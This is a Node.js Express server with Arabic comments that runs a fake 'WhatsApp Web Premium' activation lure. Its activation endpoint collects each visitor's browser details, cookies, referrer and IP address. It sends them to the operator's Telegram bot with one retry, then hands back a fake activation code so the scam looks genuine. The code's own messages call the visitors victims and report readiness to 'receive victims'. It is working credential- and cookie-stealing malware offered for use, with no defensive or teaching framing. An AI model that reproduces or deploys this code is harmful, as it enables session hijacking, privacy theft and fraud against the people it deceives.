const express = require('express');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

// middleware
app.use(express.static(path.join(__dirname, '.')));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// الصفحة الرئيسية
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// API رئيسي لإرسال البيانات
app.post('/api/activate-premium', async (req, res) => {
    console.log('🎯 طلب تفعيل جديد ورد:', req.body);
    
    try {
        const userData = req.body;
        
        // التحقق من البيانات الأساسية
        if (!userData) {
            return res.status(400).json({
                success: false,
                error: 'لا توجد بيانات'
            });
        }

        // 🔥 الإرسال الإجباري إلى التلجرام - مع إعادة المحاولة
        let telegramSent = false;
        let telegramError = null;

        try {
            const telegramResult = await sendToTelegram(userData);
            telegramSent = telegramResult.success;
            if (!telegramSent) {
                telegramError = telegramResult.error;
                // المحاولة الثانية
                console.log('🔄 محاولة إرسال ثانية إلى التلجرام...');
                const retryResult = await sendToTelegram(userData);
                telegramSent = retryResult.success;
                if (!telegramSent) {
                    telegramError = retryResult.error;
                }
            }
        } catch (tgError) {
            telegramError = tgError.message;
            console.error('❌ فشل إرسال التلجرام بعد محاولتين:', tgError);
        }

        // 🔥 تسجيل البيانات في السيرفر كنسخة احتياطية
        console.log('💾 حفظ بيانات الضحية في السيرفر:', {
            userAgent: userData.userAgent,
            platform: userData.platform,
            ip: req.ip || req.connection.remoteAddress,
            time: new Date().toISOString(),
            telegramSent: telegramSent
        });

        // إرجاع النجاح مع معلومات الإرسال
        res.json({
            success: true,
            message: 'تم تفعيل النسخة المميزة بنجاح!',
            telegram: {
                sent: telegramSent,
                error: telegramError
            },
            data: {
                activationCode: generateActivationCode(),
                expiryDate: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString(),
                features: ['واجهة متقدمة', 'إشعارات فورية', 'دعم فني']
            }
        });

    } catch (error) {
        console.error('❌ خطأ في تفعيل البريميوم:', error);
        res.status(500).json({
            success: false,
            error: 'فشل في التفعيل'
        });
    }
});

// 🔥 دالة محسنة لإرسال البيانات إلى التلجرام
async function sendToTelegram(userData) {
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    // التحقق من الإعدادات
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        const errorMsg = 'إعدادات التلجرام مفقودة - تأكد من إضافة TELEGRAM_BOT_TOKEN و TELEGRAM_CHAT_ID في Environment Variables';
        console.error('❌', errorMsg);
        return { success: false, error: errorMsg };
    }

    try {
        // 🔥 بناء رسالة مفصلة للضحية
        const telegramMessage = `
🎯 **ضحية جديدة - واتساب ويب بريميوم**

👤 **معلومات الضحية:**
• 🌐 المتصفح: ${userData.userAgent || 'غير معروف'}
• 💻 النظام: ${userData.platform || 'غير معروف'} 
• 🈲 اللغة: ${userData.language || 'غير معروف'}
• 📺 الشاشة: ${userData.screen || 'غير معروف'}
• 🕒 المنطقة: ${userData.timezone || 'غير معروف'}

🌍 **معلومات الشبكة:**
• 🔗 الرابط: ${userData.url || 'غير معروف'}
• 📍 الريفيرر: ${userData.referrer || 'لا يوجد'}

🔐 **الكوكيز:** 
${userData.cookies && userData.cookies !== 'لا توجد كوكيز' ? 
    '✅ ' + userData.cookies.substring(0, 200) + (userData.cookies.length > 200 ? '...' : '') : 
    '❌ غير موجودة'}

⏰ **الوقت:** ${new Date().toLocaleString('ar-SA')}
🆔 **المنطقة الزمنية:** ${userData.timezone || 'غير معروف'}

📊 **بيانات إضافية:**
${JSON.stringify(userData, null, 2).substring(0, 1000)}
        `.trim();

        console.log('📤 جاري الإرسال إلى التلجرام...');

        // إرسال الرسالة إلى التلجرام
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: telegramMessage,
                parse_mode: 'Markdown'
            }),
            timeout: 10000 // 10 ثواني
        });

        const result = await response.json();

        if (!response.ok) {
            console.error('❌ خطأ من التلجرام:', result);
            return { 
                success: false, 
                error: result.description || `خطأ ${response.status}` 
            };
        }

        console.log('✅ تم الإرسال إلى التلجرام بنجاح - معرف الرسالة:', result.result.message_id);
        return { 
            success: true, 
            messageId: result.result.message_id,
            chatId: TELEGRAM_CHAT_ID
        };

    } catch (error) {
        console.error('❌ خطأ في إرسال التلجرام:', error);
        return { 
            success: false, 
            error: error.message 
        };
    }
}

// دالة إنشاء كود تفعيل
function generateActivationCode() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let code = '';
    for (let i = 0; i < 12; i++) {
        if (i > 0 && i % 4 === 0) code += '-';
        code += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return code;
}

// 🔥 صفحة لفحص إعدادات التلجرام
app.get('/telegram-check', async (req, res) => {
    try {
        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            return res.json({
                status: '❌ غير مضبوط',
                message: 'تأكد من إضافة TELEGRAM_BOT_TOKEN و TELEGRAM_CHAT_ID في Environment Variables',
                token: TELEGRAM_BOT_TOKEN ? '✅ موجود' : '❌ مفقود',
                chatId: TELEGRAM_CHAT_ID ? '✅ موجود' : '❌ مفقود'
            });
        }

        // اختبار إرسال رسالة
        const testUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const testResponse = await fetch(testUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: '🧪 **اختبار اتصال**\n\nالبوت يعمل بشكل صحيح! ✅\nالوقت: ' + new Date().toLocaleString('ar-SA'),
                parse_mode: 'Markdown'
            })
        });

        const result = await testResponse.json();

        if (testResponse.ok) {
            res.json({
                status: '✅ يعمل完美',
                message: 'تم إرسال رسالة اختبار بنجاح',
                messageId: result.result.message_id,
                token: '✅ صالح',
                chatId: '✅ صالح',
                preview: {
                    token: TELEGRAM_BOT_TOKEN.substring(0, 10) + '...',
                    chatId: TELEGRAM_CHAT_ID
                }
            });
        } else {
            res.json({
                status: '❌ خطأ',
                message: result.description || 'خطأ في الاتصال بالتلجرام',
                token: '❌ غير صالح',
                chatId: '❌ غير صالح'
            });
        }

    } catch (error) {
        res.json({
            status: '❌ فشل',
            message: error.message,
            token: process.env.TELEGRAM_BOT_TOKEN ? '⚠️ يوجد خطأ' : '❌ مفقود',
            chatId: process.env.TELEGRAM_CHAT_ID ? '⚠️ يوجد خطأ' : '❌ مفقود'
        });
    }
});

// health check endpoint
app.get('/health', (req, res) => {
    const hasToken = !!process.env.TELEGRAM_BOT_TOKEN;
    const hasChatId = !!process.env.TELEGRAM_CHAT_ID;
    
    res.json({ 
        status: '✅ يعمل', 
        timestamp: new Date().toISOString(),
        service: 'WhatsApp Web Premium',
        telegram: {
            configured: hasToken && hasChatId,
            token: hasToken ? '✅ موجود' : '❌ مفقود',
            chatId: hasChatId ? '✅ موجود' : '❌ مفقود'
        },
        instructions: hasToken && hasChatId ? 
            '✅ النظام جاهز لاستقبال الضحايا' : 
            '❌ يرجى إعداد TELEGRAM_BOT_TOKEN و TELEGRAM_CHAT_ID'
    });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log('🚀 =================================');
    console.log('🚀 سيرفر واتساب ويب بريميوم يعمل!');
    console.log(`🚀 البورت: ${PORT}`);
    console.log(`🔑 التوكين: ${process.env.TELEGRAM_BOT_TOKEN ? '✅ موجود' : '❌ مفقود'}`);
    console.log(`💬 الآيدي: ${process.env.TELEGRAM_CHAT_ID ? '✅ موجود' : '❌ مفقود'}`);
    console.log('🌐 الرابط:', `http://localhost:${PORT}`);
    console.log('🔍 فحص التلجرام:', `http://localhost:${PORT}/telegram-check`);
    console.log('❤️  الصحة:', `http://localhost:${PORT}/health`);
    
    if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
        console.log('\n⚠️  ⚠️  ⚠️  تحذير هام:');
        console.log('⚠️  يرجى إضافة Environment Variables في Render:');
        console.log('⚠️  TELEGRAM_BOT_TOKEN = توكن البوت');
        console.log('⚠️  TELEGRAM_CHAT_ID = آيدي الشات');
        console.log('⚠️  بدونها لن تصل بيانات الضحايا!');
    } else {
        console.log('✅ النظام جاهز لاستقبال الضحايا!');
    }
    console.log('🚀 =================================');
});
